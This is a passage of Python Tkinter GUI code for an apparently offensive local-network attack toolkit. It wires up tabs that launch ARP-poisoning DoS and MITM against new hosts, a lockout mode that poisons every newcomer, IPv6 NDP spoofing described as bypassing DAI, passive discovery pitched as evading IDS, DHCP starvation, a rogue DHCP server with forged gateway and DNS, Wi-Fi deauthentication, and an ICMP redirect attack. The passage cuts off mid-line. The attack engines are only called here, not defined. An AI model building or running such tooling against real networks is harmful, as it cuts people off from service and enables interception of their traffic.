        self._aa_interval_var = tk.IntVar(value=60)
        ttk.Scale(itv_row, from_=10, to=300, variable=self._aa_interval_var,
                  orient='horizontal').pack(side='left', fill='x', expand=True)
        self._aa_itv_lbl = tk.Label(itv_row, text='60 s',
                                     font=('Consolas', 9), bg=BG3, fg=CYAN, width=7)
        self._aa_itv_lbl.pack(side='left', padx=6)
        self._aa_interval_var.trace_add('write',
            lambda *_: self._aa_itv_lbl.configure(
                text=f'{int(self._aa_interval_var.get())} s'))

        tk.Label(ctrl, text='ATTACK MODE', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 6))
        self._aa_mode = tk.StringVar(value='dos')
        mode_row = tk.Frame(ctrl, bg=BG3)
        mode_row.pack(fill='x', padx=8)
        ttk.Radiobutton(mode_row, text='DoS  (drop traffic — new host loses internet)',
                        variable=self._aa_mode, value='dos').pack(anchor='w', pady=2)
        ttk.Radiobutton(mode_row, text='MITM  (forward traffic — intercept new host)',
                        variable=self._aa_mode, value='mitm').pack(anchor='w', pady=2)

        # Known hosts counter
        stat_row = tk.Frame(body, bg=BG3, padx=16, pady=8)
        stat_row.pack(fill='x', pady=(0, 6))
        tk.Label(stat_row, text='Seeded known hosts:',
                 font=('Consolas', 9), bg=BG3, fg=TEXT_DIM).pack(side='left')
        self._aa_known_var = tk.StringVar(value='(not started)')
        tk.Label(stat_row, textvariable=self._aa_known_var,
                 font=('Consolas', 9, 'bold'), bg=BG3, fg=CYAN).pack(side='left', padx=8)
        tk.Label(stat_row, text='Attacked so far:',
                 font=('Consolas', 9), bg=BG3, fg=TEXT_DIM).pack(side='left', padx=(20, 0))
        self._aa_attacked_var = tk.StringVar(value='0')
        tk.Label(stat_row, textvariable=self._aa_attacked_var,
                 font=('Consolas', 9, 'bold'), bg=BG3, fg=ACCENT).pack(side='left', padx=8)

        # Log
        log_hdr = tk.Frame(body, bg=BG2, pady=5)
        log_hdr.pack(fill='x', pady=(6, 0))
        tk.Label(log_hdr, text='  AUTO-ATTACK LOG', font=('Consolas', 9, 'bold'),
                 bg=BG2, fg=TEXT).pack(side='left')
        ttk.Button(log_hdr, text='CLEAR', style='Ghost.TButton',
                   command=lambda: self._clear_textbox(self._aa_log)).pack(side='right', padx=6)
        self._aa_log = tk.Text(body, bg=BG, fg=GREEN, font=('Consolas', 9),
                                relief='flat', wrap='word',
                                state='disabled', padx=8, pady=4)
        self._aa_log.tag_configure('error',   foreground=ACCENT)
        self._aa_log.tag_configure('success', foreground=GREEN)
        self._aa_log.tag_configure('info',    foreground=CYAN)
        self._aa_log.tag_configure('warn',    foreground=YELLOW)
        aa_sb = ttk.Scrollbar(body, orient='vertical', command=self._aa_log.yview)
        self._aa_log.configure(yscrollcommand=aa_sb.set)
        aa_sb.pack(side='right', fill='y')
        self._aa_log.pack(fill='both', expand=True)

    def _autoatk_start(self):
        iface = self._iface.get()
        if not iface:
            self._autoatk_log('[-] No interface selected', 'error')
            return
        if not self._subnets:
            self._autoatk_log('[-] No subnets configured — run AUTO-DETECT in Scanner tab',
                              'error')
            return
        known    = [h['ip'] for h in self._hosts]
        interval = int(self._aa_interval_var.get())
        mitm     = self._aa_mode.get() == 'mitm'

        self._autoatk_engine = AutoAttackEngine(
            iface        = iface,
            subnets      = self._subnets,
            whitelist_ips= self._whitelist_ips,
            log_cb       = self._autoatk_log,
            interval     = interval,
            mitm         = mitm,
        )
        self._autoatk_engine.start(known_ips=known)
        self._aa_start_btn.configure(state='disabled')
        self._aa_stop_btn.configure(state='normal')
        self._aa_badge_var.set('● RUNNING')
        self._aa_known_var.set(f'{len(known)} host(s)')
        self._aa_attacked_var.set('0')
        self._autoatk_update_stats()

    def _autoatk_update_stats(self):
        if self._autoatk_engine and self._autoatk_engine._active:
            n = len(self._autoatk_engine._attack_tgts)
            self._aa_attacked_var.set(str(n))
            self.after(2000, self._autoatk_update_stats)

    def _autoatk_stop(self):
        if self._autoatk_engine:
            self._autoatk_engine.stop()
            self._autoatk_engine = None
        self._aa_start_btn.configure(state='normal')
        self._aa_stop_btn.configure(state='disabled')
        self._aa_badge_var.set('● STOPPED')

    def _autoatk_log(self, msg, level=''):
        def _do():
            self._aa_log.configure(state='normal')
            ts  = time.strftime('%H:%M:%S')
            tag = level if level in ('error', 'success', 'info', 'warn') else ''
            self._aa_log.insert('end', f'[{ts}]  {msg}\n', tag)
            self._aa_log.see('end')
            self._aa_log.configure(state='disabled')
            self.log(msg, level)
        self.after(0, _do)

    # ── Lockout tab ───────────────────────────────────────────────────────────

    def _build_lockout_tab(self):
        f = self._tab_lockout

        hdr = tk.Frame(f, bg=BG2, pady=8)
        hdr.pack(fill='x')
        tk.Label(hdr, text='  ⛔  LOCKOUT  —  Block all new network joiners',
                 font=('Consolas', 11, 'bold'), bg=BG2, fg=ACCENT).pack(side='left', padx=4)

        warn = tk.Frame(f, bg='#1a0a00', pady=6)
        warn.pack(fill='x')
        tk.Label(warn,
                 text='  ⚠  When enabled, any host that joins AFTER activation is ARP-poisoned '
                      '(DoS — no internet).  Hosts present at enable time are left untouched.',
                 font=('Consolas', 8), bg='#1a0a00', fg=YELLOW).pack(anchor='w', padx=8)

        # Bottom bar first
        btn_bar = tk.Frame(f, bg=BG2, pady=8)
        btn_bar.pack(fill='x', side='bottom', padx=10)
        self._lo_start_btn = ttk.Button(btn_bar, text='▶  ENABLE LOCKOUT',
                                         style='Accent.TButton',
                                         command=self._lockout_start)
        self._lo_start_btn.pack(side='left', padx=(0, 8))
        self._lo_stop_btn = ttk.Button(btn_bar, text='■  DISABLE',
                                        style='Ghost.TButton',
                                        command=self._lockout_stop,
                                        state='disabled')
        self._lo_stop_btn.pack(side='left')
        self._lo_badge_var = tk.StringVar(value='● INACTIVE')
        tk.Label(btn_bar, textvariable=self._lo_badge_var,
                 font=('Consolas', 9, 'bold'), bg=BG2, fg=TEXT_DIM).pack(side='left', padx=16)

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=14, pady=8)

        # Controls
        ctrl = tk.Frame(body, bg=BG3, padx=16, pady=14)
        ctrl.pack(fill='x', pady=(0, 10))

        tk.Label(ctrl, text='SCAN INTERVAL', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 6))
        lo_itv_row = tk.Frame(ctrl, bg=BG3)
        lo_itv_row.pack(fill='x', padx=8, pady=(0, 12))
        self._lo_interval_var = tk.IntVar(value=15)
        ttk.Scale(lo_itv_row, from_=5, to=120, variable=self._lo_interval_var,
                  orient='horizontal').pack(side='left', fill='x', expand=True)
        self._lo_itv_lbl = tk.Label(lo_itv_row, text='15 s',
                                     font=('Consolas', 9), bg=BG3, fg=CYAN, width=7)
        self._lo_itv_lbl.pack(side='left', padx=6)
        self._lo_interval_var.trace_add('write',
            lambda *_: self._lo_itv_lbl.configure(
                text=f'{int(self._lo_interval_var.get())} s'))

        # Status row
        stat_row = tk.Frame(ctrl, bg=BG3)
        stat_row.pack(fill='x', padx=8, pady=(0, 4))
        tk.Label(stat_row, text='Allowed hosts (at enable time):',
                 font=('Consolas', 9), bg=BG3, fg=TEXT_DIM).pack(side='left')
        self._lo_allowed_var = tk.StringVar(value='(scan first)')
        tk.Label(stat_row, textvariable=self._lo_allowed_var,
                 font=('Consolas', 9, 'bold'), bg=BG3, fg=CYAN).pack(side='left', padx=8)
        ttk.Button(stat_row, text='⟳ REFRESH', style='Ghost.TButton',
                   command=self._lockout_refresh_count).pack(side='left', padx=4)

        blocked_row = tk.Frame(ctrl, bg=BG3)
        blocked_row.pack(fill='x', padx=8, pady=(0, 4))
        tk.Label(blocked_row, text='Currently blocked:',
                 font=('Consolas', 9), bg=BG3, fg=TEXT_DIM).pack(side='left')
        self._lo_blocked_var = tk.StringVar(value='0')
        tk.Label(blocked_row, textvariable=self._lo_blocked_var,
                 font=('Consolas', 9, 'bold'), bg=BG3, fg=ACCENT).pack(side='left', padx=8)

        # How it works
        tip = tk.Frame(body, bg=BG3, padx=14, pady=10)
        tip.pack(fill='x', pady=(0, 6))
        tk.Label(tip,
                 text='HOW IT WORKS', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 4))
        tk.Label(tip,
                 text='1. Run SCAN in the Scanner tab to discover current hosts.\n'
                      '2. Click ENABLE LOCKOUT — those hosts become the "allowed" set.\n'
                      '3. Every N seconds the network is scanned for new devices.\n'
                      '4. Any device not in the allowed set is ARP-poisoned (DoS mode).\n'
                      '5. Click DISABLE to stop lockout and restore ARP for blocked hosts.',
                 font=('Consolas', 9), bg=BG3, fg=TEXT_DIM, justify='left').pack(anchor='w')

        # Log
        log_hdr = tk.Frame(body, bg=BG2, pady=5)
        log_hdr.pack(fill='x', pady=(6, 0))
        tk.Label(log_hdr, text='  LOCKOUT LOG', font=('Consolas', 9, 'bold'),
                 bg=BG2, fg=TEXT).pack(side='left')
        ttk.Button(log_hdr, text='CLEAR', style='Ghost.TButton',
                   command=lambda: self._clear_textbox(self._lo_log)).pack(side='right', padx=6)
        self._lo_log = tk.Text(body, bg=BG, fg=GREEN, font=('Consolas', 9),
                                relief='flat', wrap='word',
                                state='disabled', padx=8, pady=4)
        self._lo_log.tag_configure('error',   foreground=ACCENT)
        self._lo_log.tag_configure('success', foreground=GREEN)
        self._lo_log.tag_configure('info',    foreground=CYAN)
        self._lo_log.tag_configure('warn',    foreground=YELLOW)
        lo_sb = ttk.Scrollbar(body, orient='vertical', command=self._lo_log.yview)
        self._lo_log.configure(yscrollcommand=lo_sb.set)
        lo_sb.pack(side='right', fill='y')
        self._lo_log.pack(fill='both', expand=True)

        self._lockout_refresh_count()

    def _lockout_refresh_count(self):
        n = len(self._hosts)
        self._lo_allowed_var.set(
            f'{n} host(s) from last scan' if n else '(scan first)')

    def _lockout_start(self):
        iface = self._iface.get()
        if not iface:
            self._lockout_log('[-] No interface selected', 'error')
            return
        if not self._subnets:
            self._lockout_log('[-] No subnets configured — run AUTO-DETECT in Scanner tab',
                              'error')
            return
        allowed  = [h['ip'] for h in self._hosts]
        interval = int(self._lo_interval_var.get())

        self._lockout_engine = LockoutEngine(
            iface        = iface,
            subnets      = self._subnets,
            whitelist_ips= self._whitelist_ips,
            log_cb       = self._lockout_log,
            interval     = interval,
        )
        self._lockout_engine.start(allowed_hosts=allowed)
        self._lo_start_btn.configure(state='disabled')
        self._lo_stop_btn.configure(state='normal')
        self._lo_badge_var.set('● ACTIVE')
        self._lo_allowed_var.set(f'{len(allowed)} host(s)')
        self._lo_blocked_var.set('0')
        self._lockout_update_blocked()

    def _lockout_update_blocked(self):
        if self._lockout_engine and self._lockout_engine._active:
            n = len(self._lockout_engine._blocked)
            self._lo_blocked_var.set(str(n))
            self.after(2000, self._lockout_update_blocked)

    def _lockout_stop(self):
        if self._lockout_engine:
            self._lockout_engine.stop()
            self._lockout_engine = None
        self._lo_start_btn.configure(state='normal')
        self._lo_stop_btn.configure(state='disabled')
        self._lo_badge_var.set('● INACTIVE')
        self._lo_blocked_var.set('0')

    def _lockout_log(self, msg, level=''):
        def _do():
            self._lo_log.configure(state='normal')
            ts  = time.strftime('%H:%M:%S')
            tag = level if level in ('error', 'success', 'info', 'warn') else ''
            self._lo_log.insert('end', f'[{ts}]  {msg}\n', tag)
            self._lo_log.see('end')
            self._lo_log.configure(state='disabled')
            self.log(msg, level)
        self.after(0, _do)

    # ── Sniffer PCAP export ───────────────────────────────────────────────────

    def _sniffer_save_pcap(self):
        if not self._sniffer_engine or not self._sniffer_engine._pcap_buf:
            messagebox.showinfo('PCAP', 'No packets captured yet.', parent=self)
            return
        path = filedialog.asksaveasfilename(
            parent=self, defaultextension='.pcap',
            filetypes=[('PCAP files', '*.pcap'), ('All files', '*.*')],
            title='Save captured packets')
        if not path:
            return
        if self._sniffer_engine.save_pcap(path):
            self.log(f'PCAP saved → {path}', 'success')
        else:
            messagebox.showerror('PCAP', 'Failed to write PCAP file.', parent=self)

    # ── IPv6 / NDP tab ────────────────────────────────────────────────────────

    def _build_ipv6_tab(self):
        f = self._tab_ipv6

        tk.Label(f, text='  IPv6 / NDP SPOOF', font=('Consolas', 11, 'bold'),
                 bg=BG, fg=ACCENT).pack(anchor='w', padx=12, pady=(12, 2))

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  Poisons IPv6 Neighbor Discovery caches with forged ICMPv6 NA messages.\n'
                      '  Bypasses DAI (Dynamic ARP Inspection) — effective on pure-IPv6 and dual-stack segments.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        if not IPV6_OK:
            tk.Label(f, text='  ✖  Scapy IPv6 modules not available.',
                     font=('Consolas', 10), bg=BG, fg='#c0392b').pack(anchor='w', padx=12, pady=20)
            return

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=12, pady=4)

        row = tk.Frame(body, bg=BG)
        row.pack(fill='x', pady=3)
        tk.Label(row, text='Interface:', font=('Consolas', 9), bg=BG, fg=FG, width=14, anchor='w').pack(side='left')
        self._ipv6_iface_var = tk.StringVar(value=self._iface.get())
        ttk.Entry(row, textvariable=self._ipv6_iface_var, width=18).pack(side='left', padx=4)

        row2 = tk.Frame(body, bg=BG)
        row2.pack(fill='x', pady=3)
        tk.Label(row2, text='Target IPv6:', font=('Consolas', 9), bg=BG, fg=FG, width=14, anchor='w').pack(side='left')
        self._ipv6_tgt_var = tk.StringVar()
        ttk.Entry(row2, textvariable=self._ipv6_tgt_var, width=36).pack(side='left', padx=4)

        row3 = tk.Frame(body, bg=BG)
        row3.pack(fill='x', pady=3)
        tk.Label(row3, text='Spoof as IPv6:', font=('Consolas', 9), bg=BG, fg=FG, width=14, anchor='w').pack(side='left')
        self._ipv6_spoof_var = tk.StringVar()
        ttk.Entry(row3, textvariable=self._ipv6_spoof_var, width=36).pack(side='left', padx=4)

        tb = tk.Frame(body, bg=BG)
        tb.pack(fill='x', pady=6)
        self._ipv6_start_btn = ttk.Button(tb, text='▶  START', style='Action.TButton',
                                           command=self._ipv6_start)
        self._ipv6_start_btn.pack(side='left', padx=4)
        self._ipv6_stop_btn = ttk.Button(tb, text='■  STOP', style='Ghost.TButton',
                                          command=self._ipv6_stop, state='disabled')
        self._ipv6_stop_btn.pack(side='left', padx=4)

        self._ipv6_log_box = tk.Text(body, height=10, bg='#060c16', fg='#7eb3e0',
                                      font=('Consolas', 8), state='disabled', relief='flat')
        self._ipv6_log_box.pack(fill='both', expand=True, pady=4)

    def _ipv6_start(self):
        iface  = self._ipv6_iface_var.get().strip()
        target = self._ipv6_tgt_var.get().strip()
        spoof  = self._ipv6_spoof_var.get().strip()
        if not iface or not target or not spoof:
            messagebox.showwarning('IPv6', 'Fill in Interface, Target IPv6, and Spoof IPv6.', parent=self)
            return
        try:
            src_mac = get_if_hwaddr(iface)
        except Exception as e:
            messagebox.showerror('IPv6', f'Interface error: {e}', parent=self)
            return
        self._ndp_engine = NDPSpoofEngine(iface, target, spoof, src_mac, self._ipv6_log)
        self._ndp_engine.start()
        self._ipv6_start_btn.configure(state='disabled')
        self._ipv6_stop_btn.configure(state='normal')

    def _ipv6_stop(self):
        if self._ndp_engine:
            self._ndp_engine.stop()
            self._ndp_engine = None
        self._ipv6_start_btn.configure(state='normal')
        self._ipv6_stop_btn.configure(state='disabled')

    def _ipv6_log(self, msg, level=''):
        def _do():
            self._ipv6_log_box.configure(state='normal')
            ts = time.strftime('%H:%M:%S')
            self._ipv6_log_box.insert('end', f'[{ts}]  {msg}\n')
            self._ipv6_log_box.see('end')
            self._ipv6_log_box.configure(state='disabled')
        self.after(0, _do)

    # ── Passive Discovery tab ─────────────────────────────────────────────────

    def _build_passive_tab(self):
        f = self._tab_passive

        tk.Label(f, text='  PASSIVE DISCOVERY', font=('Consolas', 11, 'bold'),
                 bg=BG, fg=ACCENT).pack(anchor='w', padx=12, pady=(12, 2))

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  Listens silently for ARP, DHCP, mDNS, and SSDP broadcasts — zero packets sent.\n'
                      '  Maps live hosts without triggering IDS/IPS scanners or leaving ARP-request traces.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=12, pady=4)

        row = tk.Frame(body, bg=BG)
        row.pack(fill='x', pady=3)
        tk.Label(row, text='Interface:', font=('Consolas', 9), bg=BG, fg=FG, width=14, anchor='w').pack(side='left')
        self._passive_iface_var = tk.StringVar(value=self._iface.get())
        ttk.Entry(row, textvariable=self._passive_iface_var, width=18).pack(side='left', padx=4)

        tb = tk.Frame(body, bg=BG)
        tb.pack(fill='x', pady=6)
        self._passive_start_btn = ttk.Button(tb, text='▶  LISTEN', style='Action.TButton',
                                              command=self._passive_start)
        self._passive_start_btn.pack(side='left', padx=4)
        self._passive_stop_btn = ttk.Button(tb, text='■  STOP', style='Ghost.TButton',
                                             command=self._passive_stop, state='disabled')
        self._passive_stop_btn.pack(side='left', padx=4)
        ttk.Button(tb, text='↓ Import to Scanner', style='Ghost.TButton',
                   command=self._passive_import).pack(side='left', padx=4)

        cols = ('ip', 'mac', 'source')
        self._passive_tree = ttk.Treeview(body, columns=cols, show='headings', height=12,
                                           style='Custom.Treeview')
        for c, w, h in [('ip', 140, 'IP Address'), ('mac', 160, 'MAC Address'), ('source', 100, 'Source')]:
            self._passive_tree.heading(c, text=h)
            self._passive_tree.column(c, width=w, anchor='w')
        self._passive_tree.pack(fill='both', expand=True, pady=4)

        self._passive_hosts = {}   # ip -> (mac, source)

    def _passive_start(self):
        iface = self._passive_iface_var.get().strip()
        if not iface:
            messagebox.showwarning('Passive', 'Enter interface name.', parent=self)
            return
        self._passive_engine = PassiveDiscoveryEngine(iface, self._passive_on_host)
        self._passive_engine.start()
        self._passive_start_btn.configure(state='disabled')
        self._passive_stop_btn.configure(state='normal')

    def _passive_stop(self):
        if self._passive_engine:
            self._passive_engine.stop()
            self._passive_engine = None
        self._passive_start_btn.configure(state='normal')
        self._passive_stop_btn.configure(state='disabled')

    def _passive_on_host(self, ip, mac, source):
        def _do():
            if ip not in self._passive_hosts:
                self._passive_hosts[ip] = (mac, source)
                self._passive_tree.insert('', 'end', iid=ip, values=(ip, mac, source))
        self.after(0, _do)

    def _passive_import(self):
        for ip, (mac, _) in self._passive_hosts.items():
            if ip not in [h['ip'] for h in self._hosts]:
                self._hosts.append({'ip': ip, 'mac': mac, 'hostname': '', 'netbios': '',
                                    'vendor': '', 'os': '', 'type': 'passive'})
        self._rebuild_tree()
        self.log(f'Imported {len(self._passive_hosts)} passive hosts into scanner.', 'success')

    # ── DHCP Attacks tab ─────────────────────────────────────────────────────

    def _build_dhcp_tab(self):
        f = self._tab_dhcp

        tk.Label(f, text='  DHCP ATTACKS', font=('Consolas', 11, 'bold'),
                 bg=BG, fg=ACCENT).pack(anchor='w', padx=12, pady=(12, 2))

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  DHCP Starvation floods the pool with random-MAC DISCOVERs — new clients get no IP.\n'
                      '  Rogue DHCP responds faster than the real server, pushing a forged gateway and DNS.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        if not DHCP_OK:
            tk.Label(f, text='  ✖  Scapy BOOTP/DHCP modules not available.',
                     font=('Consolas', 10), bg=BG, fg='#c0392b').pack(anchor='w', padx=12, pady=20)
            return

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=12, pady=4)

        # ── Starvation ───────────────────────────────────────────────────────
        tk.Label(body, text='Starvation', font=('Consolas', 9, 'bold'), bg=BG, fg='#7eb3e0').pack(anchor='w', pady=(4, 2))

        row = tk.Frame(body, bg=BG)
        row.pack(fill='x', pady=2)
        tk.Label(row, text='Interface:', font=('Consolas', 9), bg=BG, fg=FG, width=14, anchor='w').pack(side='left')
        self._dhcps_iface_var = tk.StringVar(value=self._iface.get())
        ttk.Entry(row, textvariable=self._dhcps_iface_var, width=18).pack(side='left', padx=4)
        tk.Label(row, text='Rate (pkt/s):', font=('Consolas', 9), bg=BG, fg=FG).pack(side='left', padx=(12, 4))
        self._dhcps_rate_var = tk.StringVar(value='10')
        ttk.Entry(row, textvariable=self._dhcps_rate_var, width=6).pack(side='left')

        tb1 = tk.Frame(body, bg=BG)
        tb1.pack(fill='x', pady=4)
        self._dhcps_start_btn = ttk.Button(tb1, text='▶  STARVE', style='Action.TButton',
                                            command=self._dhcps_start)
        self._dhcps_start_btn.pack(side='left', padx=4)
        self._dhcps_stop_btn = ttk.Button(tb1, text='■  STOP', style='Ghost.TButton',
                                           command=self._dhcps_stop, state='disabled')
        self._dhcps_stop_btn.pack(side='left', padx=4)
        self._dhcps_sent_var = tk.StringVar(value='Sent: 0')
        tk.Label(tb1, textvariable=self._dhcps_sent_var, font=('Consolas', 8),
                 bg=BG, fg='#7eb3e0').pack(side='left', padx=8)

        ttk.Separator(body, orient='horizontal').pack(fill='x', pady=8)

        # ── Rogue DHCP ───────────────────────────────────────────────────────
        tk.Label(body, text='Rogue DHCP Server', font=('Consolas', 9, 'bold'), bg=BG, fg='#7eb3e0').pack(anchor='w', pady=(2, 2))

        row2 = tk.Frame(body, bg=BG)
        row2.pack(fill='x', pady=2)
        tk.Label(row2, text='Interface:', font=('Consolas', 9), bg=BG, fg=FG, width=14, anchor='w').pack(side='left')
        self._rdhcp_iface_var = tk.StringVar(value=self._iface.get())
        ttk.Entry(row2, textvariable=self._rdhcp_iface_var, width=18).pack(side='left', padx=4)

        row3 = tk.Frame(body, bg=BG)
        row3.pack(fill='x', pady=2)
        tk.Label(row3, text='Fake Gateway:', font=('Consolas', 9), bg=BG, fg=FG, width=14, anchor='w').pack(side='left')
        self._rdhcp_gw_var = tk.StringVar(value='192.168.1.1')
        ttk.Entry(row3, textvariable=self._rdhcp_gw_var, width=18).pack(side='left', padx=4)
        tk.Label(row3, text='Fake DNS:', font=('Consolas', 9), bg=BG, fg=FG).pack(side='left', padx=(12, 4))
        self._rdhcp_dns_var = tk.StringVar(value='192.168.1.1')
        ttk.Entry(row3, textvariable=self._rdhcp_dns_var, width=18).pack(side='left')

        tb2 = tk.Frame(body, bg=BG)
        tb2.pack(fill='x', pady=4)
        self._rdhcp_start_btn = ttk.Button(tb2, text='▶  DEPLOY', style='Action.TButton',
                                            command=self._rdhcp_start)
        self._rdhcp_start_btn.pack(side='left', padx=4)
        self._rdhcp_stop_btn = ttk.Button(tb2, text='■  STOP', style='Ghost.TButton',
                                           command=self._rdhcp_stop, state='disabled')
        self._rdhcp_stop_btn.pack(side='left', padx=4)
        self._rdhcp_served_var = tk.StringVar(value='Served: 0')
        tk.Label(tb2, textvariable=self._rdhcp_served_var, font=('Consolas', 8),
                 bg=BG, fg='#7eb3e0').pack(side='left', padx=8)

        self._dhcp_log_box = tk.Text(body, height=6, bg='#060c16', fg='#7eb3e0',
                                      font=('Consolas', 8), state='disabled', relief='flat')
        self._dhcp_log_box.pack(fill='both', expand=True, pady=4)

    def _dhcps_start(self):
        iface = self._dhcps_iface_var.get().strip()
        try:
            rate = int(self._dhcps_rate_var.get())
        except ValueError:
            rate = 10
        self._dhcp_starv_eng = DHCPStarvationEngine(iface, rate, self._dhcp_log)
        self._dhcp_starv_eng.start()
        self._dhcps_start_btn.configure(state='disabled')
        self._dhcps_stop_btn.configure(state='normal')

        def _update_sent():
            if self._dhcp_starv_eng:
                self._dhcps_sent_var.set(f'Sent: {self._dhcp_starv_eng._sent}')
                self.after(1000, _update_sent)
        self.after(1000, _update_sent)

    def _dhcps_stop(self):
        if self._dhcp_starv_eng:
            self._dhcp_starv_eng.stop()
            self._dhcp_starv_eng = None
        self._dhcps_start_btn.configure(state='normal')
        self._dhcps_stop_btn.configure(state='disabled')

    def _rdhcp_start(self):
        iface = self._rdhcp_iface_var.get().strip()
        gw    = self._rdhcp_gw_var.get().strip()
        dns   = self._rdhcp_dns_var.get().strip()
        self._rogue_dhcp_eng = RogueDHCPEngine(iface, gw, dns, self._dhcp_log)
        self._rogue_dhcp_eng.start()
        self._rdhcp_start_btn.configure(state='disabled')
        self._rdhcp_stop_btn.configure(state='normal')

        def _update_served():
            if self._rogue_dhcp_eng:
                self._rdhcp_served_var.set(f'Served: {self._rogue_dhcp_eng._served}')
                self.after(1000, _update_served)
        self.after(1000, _update_served)

    def _rdhcp_stop(self):
        if self._rogue_dhcp_eng:
            self._rogue_dhcp_eng.stop()
            self._rogue_dhcp_eng = None
        self._rdhcp_start_btn.configure(state='normal')
        self._rdhcp_stop_btn.configure(state='disabled')

    def _dhcp_log(self, msg, level=''):
        def _do():
            self._dhcp_log_box.configure(state='normal')
            ts = time.strftime('%H:%M:%S')
            self._dhcp_log_box.insert('end', f'[{ts}]  {msg}\n')
            self._dhcp_log_box.see('end')
            self._dhcp_log_box.configure(state='disabled')
        self.after(0, _do)

    # ── Wi-Fi Deauth tab ──────────────────────────────────────────────────────

    def _build_deauth_tab(self):
        f = self._tab_deauth

        tk.Label(f, text='  WI-FI DEAUTHENTICATION', font=('Consolas', 11, 'bold'),
                 bg=BG, fg=ACCENT).pack(anchor='w', padx=12, pady=(12, 2))

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  Sends 802.11 Deauth frames (both directions) to boot clients off their AP.\n'
                      '  Requires a wireless interface in monitor mode — use airmon-ng to enable it.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        if not DOT11_OK:
            tk.Label(f, text='  ✖  Scapy Dot11/RadioTap modules not available.',
                     font=('Consolas', 10), bg=BG, fg='#c0392b').pack(anchor='w', padx=12, pady=20)
            return

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=12, pady=4)

        row = tk.Frame(body, bg=BG)
        row.pack(fill='x', pady=3)
        tk.Label(row, text='Monitor iface:', font=('Consolas', 9), bg=BG, fg=FG, width=14, anchor='w').pack(side='left')
        self._deauth_iface_var = tk.StringVar(value='wlan0mon')
        ttk.Entry(row, textvariable=self._deauth_iface_var, width=18).pack(side='left', padx=4)

        row2 = tk.Frame(body, bg=BG)
        row2.pack(fill='x', pady=3)
        tk.Label(row2, text='AP BSSID:', font=('Consolas', 9), bg=BG, fg=FG, width=14, anchor='w').pack(side='left')
        self._deauth_ap_var = tk.StringVar()
        ttk.Entry(row2, textvariable=self._deauth_ap_var, width=20).pack(side='left', padx=4)

        row3 = tk.Frame(body, bg=BG)
        row3.pack(fill='x', pady=3)
        tk.Label(row3, text='Client MACs:', font=('Consolas', 9), bg=BG, fg=FG, width=14, anchor='w').pack(side='left')
        self._deauth_client_var = tk.StringVar()
        ttk.Entry(row3, textvariable=self._deauth_client_var, width=40).pack(side='left', padx=4)
        ttk.Button(row3, text='+ Add', style='Ghost.TButton',
                   command=self._deauth_add_target).pack(side='left', padx=4)

        self._deauth_targets = []
        self._deauth_targets_var = tk.StringVar(value='Targets: none')
        tk.Label(body, textvariable=self._deauth_targets_var, font=('Consolas', 8),
                 bg=BG, fg='#7eb3e0').pack(anchor='w', pady=2)

        tb = tk.Frame(body, bg=BG)
        tb.pack(fill='x', pady=6)
        self._deauth_start_btn = ttk.Button(tb, text='▶  DEAUTH', style='Action.TButton',
                                             command=self._deauth_start)
        self._deauth_start_btn.pack(side='left', padx=4)
        self._deauth_stop_btn = ttk.Button(tb, text='■  STOP', style='Ghost.TButton',
                                            command=self._deauth_stop, state='disabled')
        self._deauth_stop_btn.pack(side='left', padx=4)

        self._deauth_log_box = tk.Text(body, height=8, bg='#060c16', fg='#7eb3e0',
                                        font=('Consolas', 8), state='disabled', relief='flat')
        self._deauth_log_box.pack(fill='both', expand=True, pady=4)

    def _deauth_add_target(self):
        mac = self._deauth_client_var.get().strip()
        if mac and mac not in self._deauth_targets:
            self._deauth_targets.append(mac)
            self._deauth_targets_var.set(f'Targets: {", ".join(self._deauth_targets)}')
        self._deauth_client_var.set('')

    def _deauth_start(self):
        iface = self._deauth_iface_var.get().strip()
        ap    = self._deauth_ap_var.get().strip()
        if not iface or not ap:
            messagebox.showwarning('Deauth', 'Enter monitor interface and AP BSSID.', parent=self)
            return
        clients = self._deauth_targets if self._deauth_targets else ['ff:ff:ff:ff:ff:ff']

        def _deauth_log(msg, level=''):
            def _do():
                self._deauth_log_box.configure(state='normal')
                ts = time.strftime('%H:%M:%S')
                self._deauth_log_box.insert('end', f'[{ts}]  {msg}\n')
                self._deauth_log_box.see('end')
                self._deauth_log_box.configure(state='disabled')
            self.after(0, _do)

        self._deauth_engine = WiFiDeauthEngine(iface, ap, clients, _deauth_log)
        self._deauth_engine.start()
        self._deauth_start_btn.configure(state='disabled')
        self._deauth_stop_btn.configure(state='normal')

    def _deauth_stop(self):
        if self._deauth_engine:
            self._deauth_engine.stop()
            self._deauth_engine = None
        self._deauth_start_btn.configure(state='normal')
        self._deauth_stop_btn.configure(state='disabled')

    # ── ICMP Redirect tab ─────────────────────────────────────────────────────

    def _build_redirect_tab(self):
        f = self._tab_redirect

        tk.Label(f, text='  ICMP REDIRECT ATTACK', font=('Consolas', 11, 'bold'),
                 bg=BG, fg=ACCENT).pack(anchor='w', padx=12, pady=(12, 2))

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  Forges ICMP Type-5 Redirect packets sourced from the real gateway to re-route traffic.\n'
